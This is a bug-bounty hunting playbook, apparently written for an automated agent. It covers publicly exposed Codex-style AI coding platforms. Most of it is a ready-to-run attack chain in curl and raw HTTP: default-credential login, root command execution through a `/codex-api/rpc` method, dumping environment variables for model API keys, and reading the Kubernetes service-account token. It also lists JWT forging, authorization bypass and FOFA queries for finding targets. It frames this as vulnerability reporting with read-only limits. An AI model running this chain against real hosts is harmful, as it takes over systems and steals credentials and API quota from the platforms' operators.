# Cloud IDE / Codex AI coding platform: weak credentials → root RCE → credential chain

> Type: authentication flaw + dangerous RPC + container / cluster credential chain
> Whether to report is governed only by `vuln-report-format.md`. Search by heading for the quick-matrix pointer.

---

## Codex-style coding platform RPC (quick-matrix pointer)

Recognize: a public coding platform exposes `/tenant-api/login` + `/codex-api/rpc` (or equivalent tenant login + Codex RPC). This is not a bash tool exposed through chat (see `agent-tool-exec-test.md`) or reading environ through an unauthenticated VS Code page (see `path-traversal-lfi-test.md`).

Test only the current site. Use the default credentials to obtain a session, then test `command/exec` / `fs/*` / `env`. Also try `meta/methods` without a Cookie. Once identified, test only the current site; do not open a new FOFA seed.

Confirmed when you obtain root, the hostname resembles a persistent compute-plane Pod, and you can read the cluster SA or model key.

False positives: a temporary wildcard-certificate instance that may be destroyed at any time; login works but RPC is unavailable; the model only claims to have executed a command. If only login works, continue testing RPC; do not count a partial chain as confirmed in the quick matrix.

---

## 1. Pattern profile (test when observed)

| Feature | Example ||
|------|------|
| Domain / product | AI coding assistant, playbook, Codex-style console (not limited to a particular vendor) ||
| Paths | `/tenant-api/login`, `/codex-api/rpc`, `/tenant-api/*` ||
| Framework clues | OpenAI Codex, `@openai/codex`, thread / model RPC ||
| Environments | dev / pre / fat / gray / sandbox (**prioritize publicly exposed DEV**, then look for an equivalent production deployment) ||
| Default credentials | Untouched defaults for this type of console (such as `admin/admin`), **not** a password dictionary for every login form ||

**Chain in one line:**

```
Weak credentials / unauthenticated login → tenant session (JWT/Cookie)
  → POST /codex-api/rpc method=command/exec（root）
  → read cluster SA + model API key + invite code through env / fs
  → consume quota / potential lateral movement / persistence
```

---

## 2. Minimum probe matrix (each candidate Host)

### 2.1 Fingerprint

```bash
# Login surface
curl -sk -o /dev/null -w "%{http_code}" -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'

# RPC surface (inspect errors without a Cookie too: 401 vs method not found vs direct execution)
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -d '{"method":"meta/methods","params":{}}'
```

Signs the service is live:
 - Login returns JSON (userId / session / password error) rather than a site-wide 405 HTML page
 - RPC returns JSON-RPC structure / a methods list / a clear unauthenticated error
 - Front-end title contains codex / playbook / coding platform

### 2.2 Weak credentials (login)

Test only untouched defaults for this type of console on the **current site** (`dig-scope` §4.1.1: login-form dictionaries are not mandatory). First check:

```bash
curl -sk -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' -D -
```

Common values: `admin/admin`, `admin/123456`; treat `TENANT_ADMIN_USERNAMES` / invite codes as keys if found. If there is no entry point or the test is disproved, stop; do not grind CAPTCHA.

Success: `Set-Cookie: tenant_session=...` or a response body containing `userId` + admin identity.

### 2.3 RCE / files / meta methods (after login)

```bash
# Enumerate methods
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -b "tenant_session=SESSION" \
  -d '{"method":"meta/methods","params":{}}'

# Command execution (minimum proof: id / whoami / hostname)
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -b "tenant_session=SESSION" \
  -d '{"method":"command/exec","params":{"command":["id"]}}'

# List directories / read files
-d '{"method":"fs/readDirectory","params":{"path":"/"}}'
-d '{"method":"fs/readFile","params":{"path":"/etc/os-release"}}'

# Environment variables (keys)
-d '{"method":"command/exec","params":{"command":["env"]}}'

# Cluster SA (if the container runs in a cluster)
-d '{"method":"command/exec","params":{"command":["cat","/var/run/secrets/kubernetes.io/serviceaccount/token"]}}'
```

**Dangerous methods (high value if present):**

|| method | Meaning ||
|--------|------|
|| `command/exec` | Arbitrary commands ||
|| `fs/readFile` / `fs/writeFile` / `fs/remove` / `fs/readDirectory` | Filesystem ||
|| `meta/methods` | Enumerate available capabilities ||
|| `thread/start` / `model/list` | AI sessions and models (consume API key quota) ||
|| Git-related RPC | Read / write code repositories ||

---

## 3. Strong evidence of impact (SRC)

Evidence priority:

1. **Root RCE:** `id` → `uid=0(root)` (minimal and reproducible)
2. **Environment and persistent service:** a hostname resembling a compute-plane Pod name is stronger evidence than random temporary-sandbox text
3. **Keys:** model `*_API_KEY` (middle characters may be redacted in the report)
4. **Cluster:** `KUBERNETES_SERVICE_HOST` is present and the SA token is readable
5. **Invite code / admin username:** allows registration of a persistent account
6. **RPC breadth:** show a sample of dangerous methods from the 80+ method list

**State the boundaries clearly:**
 - Whether access is public and unauthenticated or requires weak credentials
 - Whether access is root and whether the container is in a cluster
 - Whether the key can consume quota on an external model
 - DEV vs production: identify DEV clearly if that is the only target; stronger evidence comes from testing an equivalent **prod** deployment too

**False positive reminder:** a temporary instance under a wildcard certificate that may be destroyed at any time is not confirmed. Continue only when there is a persistent compute surface + credential chain. A partial chain (login only, no RPC) needs more RPC testing and must not be marked confirmed.

---

## 4. Find assets

**Test only the current site.** If `/tenant-api/login` or `/codex-api/rpc` is found, test §2 on this host; do not open a new seed or search FOFA for matching products across the internet (follow hunt-iter at the start and the one-seed loop in `dig-scope`). Feed back quality root domains only; search again after finishing this seed’s remaining live surfaces.

Use the following queries **only when this task and seed are already about Codex / a coding platform**, to search within this seed. Do not launch a new search campaign merely because the same framework appears:

```
body="/codex-api/rpc" || body="/tenant-api/login"
body="codex-api" && body="tenant"
body="@openai/codex" || body="command/exec"
```

Record `tenant-api`, `codex-api`, RPC methods, and invite codes from the current site’s JavaScript in that site’s checklist; do not use them to open a new seed.

---

## 5. Equivalent variants (do not rely only on admin/admin)

1. **Unauthenticated RPC:** call `command/exec` / `meta/methods` directly without a Cookie
2. **Registration endpoint + fixed invite code:** `TENANT_INVITE_CODE` hard-coded in env or front end
3. **Weak JWT secret / none algorithm:** forge admin in `tenant_session`
4. **WebSocket / another gateway:** same-origin Codex uses WS to send commands
5. **Sibling within the same seed:** briefly compare the `-dev` / production host (escalate only if a new path / response code appears). Do not open a new FOFA seed for this.
6. **Multi-tenant isolation:** check whether an ordinary user session can also call `command/exec` (vertical authorization bypass to RCE)

---

## 6. Operating rules

 - Limit command execution to **id / hostname / read-only cat of a specified path**; no destructive writes, mining, or internal-network brute force
 - Follow the platform’s redaction policy for keys in reports (include the full value only if required; otherwise redact the middle and state its length)
 - Do not stop at upload / download access; the value of this chain is **RCE + keys + cluster access**
 - Continue testing RPC for a partial chain (login only, no RCE)

---

## 7. Reference outline (no live target)

|| Item | Value ||
|----|-----|
|| Login | `POST /tenant-api/login` default credentials → `tenant_session` ||
| RCE | `POST /codex-api/rpc` `command/exec` → root |
|| Environment | Compute-plane Pod; cluster API on internal network ||
|| Chain assets | Model key, SA token, invite code, broad RPC access ||
|| Report? | Follow only `vuln-report-format.md`. Whether DEV is in scope depends on SRC policy; an equivalent prod target is stronger evidence ||

Reproduction outline (replace HOST / SESSION with real values from the current site):

```http
POST /tenant-api/login HTTP/1.1
Host: HOST
Content-Type: application/json

{"username":"admin","password":"admin"}
```

```http
POST /codex-api/rpc HTTP/1.1
Host: HOST
Content-Type: application/json
Cookie: tenant_session=SESSION

{"method":"command/exec","params":{"command":["id"]}}
```

---

## 8. In one sentence

**For a public Codex-style coding platform, test default credentials and registration codes at `/tenant-api/login` on the current site, then test `command/exec` + `fs/*` + `env` at `/codex-api/rpc`, and confirm the chain with root + cluster + API key access. Test only the current site and prioritize persistent production surfaces.**
